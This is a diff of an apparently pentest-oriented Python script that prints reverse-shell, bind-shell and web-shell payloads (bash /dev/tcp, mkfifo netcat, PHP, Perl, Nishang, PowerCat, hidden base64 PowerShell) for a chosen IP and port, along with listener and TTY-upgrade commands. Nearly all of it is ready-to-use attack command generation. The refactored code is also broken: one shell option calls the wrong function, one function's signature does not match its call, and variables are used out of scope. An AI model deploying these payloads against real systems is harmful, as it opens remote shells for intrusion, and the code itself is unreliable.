@@ -3,33 +3,25 @@
 import sys
 import subprocess
 from base64 import b64encode
-
-    
-
-def main():
-    if len(sys.argv) < 3:
-        print("Usage: script.py <IP> <PORT>")
-        sys.exit(1)
-
-    ip = sys.argv[1]
-    port = sys.argv[2]
+import argparse
 
 
-        # Ejecutar el comando "stty size"
-    output = subprocess.check_output(["stty", "size"]).decode().strip()
-    rows, columns = map(int, output.split())
 
-    
+def print_listener(port):
     print("\n********** Listener **********\n")
     print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
     print(f"rlwrap nc -nlvp {port}")
 
+def print_tty():
     print("\n********** tty **********\n")
     print(f"script /dev/null -c bash")
     print(f"ctrl + z")
     print(f"stty raw -echo; fg")
     print(f"export TERM=xterm; reset xterm")
 
+def print_powershell(ip, port):
+
+    
     print("\n\n\n********** PowerShell payload b64 encode **********\n")
     print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
 
@@ -41,6 +33,7 @@ def main():
     print(f"\npowershell -nop -w hidden -enc {encoded}")
 
 
+def print_conpty(ip, port):
     print("\n\n\n********** ConPtyShell RevShell **********\n")
     print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
 
@@ -66,7 +59,7 @@ def main():
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
-
+def print_nishang(ip, port):
 
     print("\n\n\n********** Nishang payload **********\n")
     print(f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")
@@ -94,6 +87,9 @@ def main():
 
 
 
+def print_powercat(ip, port):
+
+    
     print("\n\n\n********** PowerCat payload **********\n")
     print(f"powercat -c {ip} -p {port} -e powershell")
 
@@ -119,20 +115,17 @@ def main():
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
-    
+def print_perl():
 
-    print("\n\n\n********** Bash **********\n")
-    bash_payloads = [
-        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
-        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
-        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
-        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
-        f"nc {ip} {port} -e /bin/sh"
-    ]
-    for payload in bash_payloads:
-        print(payload)
+    print("\n********** Perl **********\n")
+    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+    print(perl_payload)
 
-    print("\n********** PHP **********\n")
+
+
+def print_php(ip, port):
+
+
     php_payloads = [
         """<?php
   if(isset($_REQUEST['cmd'])){
@@ -150,10 +143,24 @@ def main():
     for payload in php_payloads:
         print(payload)
 
-    print("\n********** Perl **********\n")
-    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
-    print(perl_payload)
+    print(f"\nphp -r '$sock=fsockopen('{ip}',{port});exec('/bin/sh <&3 >&3 2>&3');'")
 
+def print_bash(ip, port):
+
+    print("\n\n\n********** Bash **********\n")
+    bash_payloads = [
+        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
+        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
+        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
+        f"nc {ip} {port} -e /bin/sh"
+    ]
+    for payload in bash_payloads:
+        print(payload)
+
+
+
+def print_nc(ip, port):
     print("\n********** Netcat Bind Shell **********\n")
     print("Linux:\n")
     print(f"\tnc -nlvp {port} -e /bin/bash")
@@ -171,6 +178,47 @@ def main():
     print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")
 
     print(f"More shells at: /usr/share/webshells\n")
+
+
+
+def main():
+    if len(sys.argv) < 4:
+        print("Usage: script.py <IP> <PORT> <SHELL_TYPE>")
+        print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
+        sys.exit(1)
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    shell_type = sys.argv[3].lower()
+
+
+    # Ejecutar el comando "stty size"
+    output = subprocess.check_output(["stty", "size"]).decode().strip()
+    rows, columns = map(int, output.split())
+
+    print_listener(port)
+    print_tty()
+
+    if shell_type == "-powershell":
+        print_powershell(ip, port)
+    elif shell_type == "-powercat":
+        print_powercat(ip, port)
+    elif shell_type == "-nishang":
+        print_nishang(ip, port)
+    elif shell_type == "-conpty":
+        print_bash(ip, port)
+    elif shell_type == "-php":
+        print_php(ip, port)
+    elif shell_type == "-bash":
+        print_bash(ip, port)
+    elif shell_type == "-perl":
+        print_perl(ip, port)
+    elif shell_type == "-nc":
+        print_nc(ip, port)
+
+
+    else:
+        print(f"Shell type '{shell_type}' not recognized.")
 
 if __name__ == "__main__":
     main()
